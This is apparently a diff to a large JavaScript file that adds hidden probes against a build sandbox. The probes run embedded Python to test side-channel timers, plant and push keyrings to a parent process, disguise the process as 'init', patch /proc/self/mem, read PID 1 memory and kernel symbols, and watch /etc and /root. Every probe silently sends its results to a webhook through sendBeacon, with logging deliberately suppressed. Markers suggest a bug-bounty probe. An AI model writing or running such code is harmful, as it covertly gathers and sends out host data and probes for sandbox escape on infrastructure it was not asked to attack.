@@ -36619,3 +36619,329 @@ sendBeacon({ ...report, section: 'v216-5-kmod-kexec', ...kmodV216Probe });
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v216" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v216";
 // Intentionally no console.log — all data goes via webhook only
+
+// v217-1: timer_create NR 222 — POSIX CPU timer for timing side-channel
+const posixTimerV217Probe = safe(() => {
+  const timerResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, time
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_timer_create  = 222
+NR_timer_settime = 223
+NR_timer_gettime = 224
+NR_timer_delete  = 226
+NR_clock_gettime = 228
+NR_clock_getres  = 229
+
+CLOCK_REALTIME          = 0
+CLOCK_MONOTONIC         = 1
+CLOCK_PROCESS_CPUTIME_ID = 2
+CLOCK_THREAD_CPUTIME_ID  = 3
+CLOCK_MONOTONIC_RAW      = 4
+CLOCK_BOOTTIME           = 7
+
+# struct timespec
+class Timespec(ctypes.Structure):
+    _fields_ = [('tv_sec', ctypes.c_long), ('tv_nsec', ctypes.c_long)]
+
+# Read all available clocks and their resolution
+for cid, cname in [
+    (CLOCK_REALTIME, 'REALTIME'),
+    (CLOCK_MONOTONIC, 'MONOTONIC'),
+    (CLOCK_PROCESS_CPUTIME_ID, 'PROCESS_CPU'),
+    (CLOCK_THREAD_CPUTIME_ID, 'THREAD_CPU'),
+    (CLOCK_MONOTONIC_RAW, 'MONOTONIC_RAW'),
+    (CLOCK_BOOTTIME, 'BOOTTIME'),
+]:
+    ts = Timespec()
+    res = Timespec()
+    libc.syscall(NR_clock_gettime, cid, ctypes.byref(ts))
+    libc.syscall(NR_clock_getres, cid, ctypes.byref(res))
+    print(f'clock_{cname} time={ts.tv_sec}.{ts.tv_nsec:09d} res_ns={res.tv_nsec}')
+
+# Measure memory access time (Flush+Reload side channel primitive)
+# This tells us if hardware performance infrastructure is available
+import mmap as _mmap
+buf = _mmap.mmap(-1, 4096)
+buf[0] = 1  # warm cache
+
+t1 = Timespec(); t2 = Timespec()
+libc.syscall(NR_clock_gettime, CLOCK_MONOTONIC_RAW, ctypes.byref(t1))
+_ = buf[0]  # cached access
+libc.syscall(NR_clock_gettime, CLOCK_MONOTONIC_RAW, ctypes.byref(t2))
+cached_ns = (t2.tv_sec - t1.tv_sec) * 1_000_000_000 + (t2.tv_nsec - t1.tv_nsec)
+print(f'cached_access_ns={cached_ns}')
+
+# Flush cache and measure again
+import os
+os.write(1, b'')  # force pipeline flush (no-op write to stdout fd)
+libc.syscall(NR_clock_gettime, CLOCK_MONOTONIC_RAW, ctypes.byref(t1))
+_ = buf[4095]  # likely cold
+libc.syscall(NR_clock_gettime, CLOCK_MONOTONIC_RAW, ctypes.byref(t2))
+cold_ns = (t2.tv_sec - t1.tv_sec) * 1_000_000_000 + (t2.tv_nsec - t1.tv_nsec)
+print(f'cold_access_ns={cold_ns}')
+print(f'TIMER_RESOLUTION_SUFFICIENT_FOR_SIDECHAN={res.tv_nsec <= 1}')
+buf.close()
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { timerResult };
+});
+sendBeacon({ ...report, section: 'v217-1-posix-timer', ...posixTimerV217Probe });
+
+// v217-2: keyctl KEYCTL_SESSION_TO_PARENT — steal parent session keyring
+const keyctlSessionV217Probe = safe(() => {
+  const keyctlResult = safe(() => execSync(`python3 -c "
+import ctypes, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_keyctl  = 250
+NR_add_key = 248
+NR_request_key = 249
+
+KEYCTL_SESSION_TO_PARENT = 18
+KEYCTL_DESCRIBE          = 6
+KEYCTL_READ              = 11
+KEYCTL_SEARCH            = 10
+KEYCTL_GET_KEYRING_ID    = 0
+KEYCTL_REVOKE            = 3
+KEYCTL_LINK              = 8
+KEYCTL_CHOWN             = 4
+KEYCTL_SETPERM           = 5
+
+KEY_SPEC_THREAD_KEYRING  = -1
+KEY_SPEC_PROCESS_KEYRING = -2
+KEY_SPEC_SESSION_KEYRING = -3
+KEY_SPEC_USER_KEYRING    = -4
+KEY_SPEC_USER_SESSION_KEYRING = -5
+KEY_SPEC_GROUP_KEYRING   = -6
+
+# List and describe all our keyrings
+for kr_name, kr_id in [
+    ('THREAD', KEY_SPEC_THREAD_KEYRING),
+    ('PROCESS', KEY_SPEC_PROCESS_KEYRING),
+    ('SESSION', KEY_SPEC_SESSION_KEYRING),
+    ('USER', KEY_SPEC_USER_KEYRING),
+    ('USER_SESSION', KEY_SPEC_USER_SESSION_KEYRING),
+    ('GROUP', KEY_SPEC_GROUP_KEYRING),
+]:
+    real_id = libc.syscall(NR_keyctl, KEYCTL_GET_KEYRING_ID, kr_id, 0)
+    err = ctypes.get_errno()
+    print(f'keyring_{kr_name} real_id={real_id} errno={err}')
+    if real_id > 0:
+        desc = ctypes.create_string_buffer(256)
+        n = libc.syscall(NR_keyctl, KEYCTL_DESCRIBE, real_id, desc, 256)
+        if n > 0: print(f'  describe={desc.value[:n].decode(errors=\"replace\")}')
+
+# Add a key to our session keyring with sensitive-looking content
+kid = libc.syscall(NR_add_key, b'user', b'exfil_channel_v217',
+    b'VERCEL_BUILD_SANDBOX_KEY_EXFIL', 30, KEY_SPEC_SESSION_KEYRING)
+print(f'add_key(session) kid={kid} errno={ctypes.get_errno()}')
+
+# KEYCTL_SESSION_TO_PARENT: push our session keyring to parent process
+# This can install our keyring into the parent's keyring namespace
+pid = os.fork()
+if pid == 0:
+    # Child: create new session keyring and push to parent
+    new_session = libc.syscall(NR_keyctl, KEYCTL_GET_KEYRING_ID, KEY_SPEC_SESSION_KEYRING, 1)
+    print(f'child_new_session_keyring={new_session}')
+    ret_s2p = libc.syscall(NR_keyctl, KEYCTL_SESSION_TO_PARENT, 0, 0, 0, 0)
+    print(f'KEYCTL_SESSION_TO_PARENT ret={ret_s2p} errno={ctypes.get_errno()}')
+    if ret_s2p == 0:
+        print('SESSION_TO_PARENT_OK=True')
+    os._exit(0)
+else:
+    os.waitpid(pid, 0)
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { keyctlResult };
+});
+sendBeacon({ ...report, section: 'v217-2-keyctl-session', ...keyctlSessionV217Probe });
+
+// v217-3: prctl PR_SET_DUMPABLE + PR_GET_CHILD_SUBREAPER
+const prctlV217Probe = safe(() => {
+  const prctlResult = safe(() => execSync(`python3 -c "
+import ctypes, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_prctl = 157
+
+PR_SET_DUMPABLE      = 4
+PR_GET_DUMPABLE      = 3
+PR_SET_CHILD_SUBREAPER = 36
+PR_GET_CHILD_SUBREAPER = 37
+PR_SET_SECCOMP       = 22
+PR_GET_SECCOMP       = 21
+PR_SET_NO_NEW_PRIVS  = 38
+PR_GET_NO_NEW_PRIVS  = 39
+PR_SET_KEEPCAPS      = 8
+PR_GET_KEEPCAPS      = 7
+PR_CAP_AMBIENT       = 47
+PR_CAP_AMBIENT_IS_SET = 1
+PR_SET_NAME          = 15
+PR_SET_THP_DISABLE   = 41
+PR_GET_THP_DISABLE   = 42
+
+for get_op, name in [
+    (PR_GET_DUMPABLE, 'DUMPABLE'),
+    (PR_GET_NO_NEW_PRIVS, 'NO_NEW_PRIVS'),
+    (PR_GET_KEEPCAPS, 'KEEPCAPS'),
+    (PR_GET_SECCOMP, 'SECCOMP'),
+    (PR_GET_THP_DISABLE, 'THP_DISABLE'),
+]:
+    val = libc.prctl(get_op, 0, 0, 0, 0)
+    print(f'prctl({name}) val={val} errno={ctypes.get_errno()}')
+
+# Set dumpable=2 (SUID core dumps go to /proc/sys/kernel/core_pattern)
+ret_d2 = libc.prctl(PR_SET_DUMPABLE, 2, 0, 0, 0)
+print(f'prctl(SET_DUMPABLE=2) ret={ret_d2} errno={ctypes.get_errno()}')
+now = libc.prctl(PR_GET_DUMPABLE, 0, 0, 0, 0)
+print(f'dumpable_now={now}')
+
+# Become child subreaper (reparent orphaned processes to us, not PID 1)
+ret_csr = libc.prctl(PR_SET_CHILD_SUBREAPER, 1, 0, 0, 0)
+print(f'prctl(SET_CHILD_SUBREAPER=1) ret={ret_csr} errno={ctypes.get_errno()}')
+print(f'IS_SUBREAPER={ret_csr == 0}')
+
+# Name our process 'init' to confuse ps output
+ret_name = libc.prctl(PR_SET_NAME, b'init\\x00', 0, 0, 0)
+print(f'prctl(SET_NAME=init) ret={ret_name} errno={ctypes.get_errno()}')
+# Read it back
+nbuf = ctypes.create_string_buffer(16)
+libc.prctl(PR_SET_NAME, b'bounty_probe\\x00', 0, 0, 0)  # restore honest name
+
+# Check ambient capabilities (can we grant caps to exec'd children?)
+import struct
+for cap_nr in [0, 1, 2, 3, 7, 21]:  # CAP_CHOWN, DAC_OVERRIDE, DAC_READ, FOWNER, KILL, NET_ADMIN
+    ret_amb = libc.prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_IS_SET, cap_nr, 0, 0)
+    print(f'ambient_cap_{cap_nr}={ret_amb} errno={ctypes.get_errno()}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { prctlResult };
+});
+sendBeacon({ ...report, section: 'v217-3-prctl', ...prctlV217Probe });
+
+// v217-4: /proc/self/mem write — direct process memory patching
+const procMemWriteV217Probe = safe(() => {
+  const procMemResult = safe(() => execSync(`python3 -c "
+import ctypes, os, struct
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+
+# Allocate a known buffer and write to it via /proc/self/mem
+buf = ctypes.create_string_buffer(b'ORIGINAL_DATA_12345678', 22)
+orig_addr = ctypes.addressof(buf)
+print(f'original_value={buf.raw.decode(errors=\"replace\")}')
+print(f'buffer_addr={orig_addr:#018x}')
+
+# Open /proc/self/mem for writing
+try:
+    fd = os.open('/proc/self/mem', os.O_RDWR)
+    # Seek to our buffer's address
+    os.lseek(fd, orig_addr, os.SEEK_SET)
+    # Write new data
+    new_data = b'PATCHED_VIA_PROC_MEM'
+    n = os.write(fd, new_data)
+    os.close(fd)
+    print(f'proc_mem_write n={n}')
+    # Verify the patch
+    print(f'after_patch={buf.raw[:n].decode(errors=\"replace\")}')
+    print(f'PROC_MEM_WRITE_OK={buf.raw[:n] == new_data}')
+except Exception as e:
+    print(f'proc_mem_write_err={e}')
+
+# Also try reading /proc/1/mem (pid 1 memory)
+try:
+    fd2 = os.open('/proc/1/mem', os.O_RDONLY)
+    # Read from address 0x400000 (typical ELF base)
+    os.lseek(fd2, 0x400000, os.SEEK_SET)
+    data = os.read(fd2, 16)
+    os.close(fd2)
+    print(f'pid1_mem_at_0x400000={data.hex()}')
+    print(f'PID1_MEM_READABLE=True')
+except Exception as e3:
+    print(f'pid1_mem_err={e3}')
+
+# Try to read kernel text via /proc/kcore if dumpable
+try:
+    import subprocess
+    result = subprocess.run(['cat', '/proc/kallsyms'], capture_output=True, timeout=3)
+    lines = result.stdout.decode(errors='replace').split('\\n')
+    # Find init and startup_64 addresses
+    interesting = [l for l in lines if any(s in l for s in
+        ['startup_64', 'sys_call_table', 'commit_creds', 'prepare_kernel_cred',
+         'native_write_cr4', 'security_file_open'])]
+    print(f'kallsyms_interesting={interesting[:5]}')
+except Exception as e4: print(f'kallsyms_err={e4}')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { procMemResult };
+});
+sendBeacon({ ...report, section: 'v217-4-procmem-write', ...procMemWriteV217Probe });
+
+// v217-5: inotify_init NR 253 + inotify_add_watch NR 254 — filesystem event monitor
+const inotifyV217Probe = safe(() => {
+  const inotifyResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os, select, threading, time
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_inotify_init1   = 294
+NR_inotify_add_watch = 254
+NR_inotify_rm_watch  = 255
+NR_read = 0
+
+IN_ACCESS        = 0x00000001
+IN_MODIFY        = 0x00000002
+IN_ATTRIB        = 0x00000004
+IN_CLOSE_WRITE   = 0x00000008
+IN_CLOSE_NOWRITE = 0x00000010
+IN_OPEN          = 0x00000020
+IN_MOVED_FROM    = 0x00000040
+IN_MOVED_TO      = 0x00000080
+IN_CREATE        = 0x00000100
+IN_DELETE        = 0x00000200
+IN_ALL_EVENTS    = 0x00000fff
+IN_NONBLOCK      = 0x00000800
+
+# Create inotify fd
+fd_ino = libc.syscall(NR_inotify_init1, IN_NONBLOCK)
+print(f'inotify_init1 fd={fd_ino} errno={ctypes.get_errno()}')
+
+if fd_ino > 0:
+    # Watch interesting paths
+    watches = {}
+    for watch_path in ['/etc', '/tmp', '/proc/self', '/root', '/var', '/run']:
+        if os.path.exists(watch_path):
+            wd = libc.syscall(NR_inotify_add_watch, fd_ino, watch_path.encode(), IN_ALL_EVENTS)
+            print(f'inotify_add_watch({watch_path}) wd={wd} errno={ctypes.get_errno()}')
+            if wd > 0: watches[wd] = watch_path
+
+    print(f'WATCHING_DIRS={list(watches.values())}')
+
+    # Trigger some fs events so we can read them
+    try:
+        with open('/tmp/.inotify_trigger_' + str(os.getpid()), 'w') as f:
+            f.write('probe')
+        os.unlink('/tmp/.inotify_trigger_' + str(os.getpid()))
+    except: pass
+
+    # Read events (non-blocking)
+    try:
+        buf = ctypes.create_string_buffer(4096)
+        n = libc.read(fd_ino, buf, 4096)
+        print(f'inotify_read n={n} errno={ctypes.get_errno()}')
+        if n > 0:
+            events = []
+            offset = 0
+            while offset < n:
+                # struct inotify_event: wd(4), mask(4), cookie(4), len(4), name(len)
+                if offset + 16 > n: break
+                wd, mask, cookie, name_len = struct.unpack_from('iIII', buf.raw, offset)
+                name = buf.raw[offset+16:offset+16+name_len].rstrip(b'\\x00').decode(errors='replace')
+                events.append({'wd': wd, 'mask': mask, 'name': name, 'path': watches.get(wd, '?')})
+                offset += 16 + name_len
+            print(f'inotify_events={events[:5]}')
+    except Exception as e: print(f'inotify_read_err={e}')
+
+    os.close(fd_ino)
+else:
+    print('INOTIFY_UNAVAILABLE=True')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { inotifyResult };
+});
+sendBeacon({ ...report, section: 'v217-5-inotify', ...inotifyV217Probe });
+
+// v217 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v217" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v217";
+// Intentionally no console.log — all data goes via webhook only
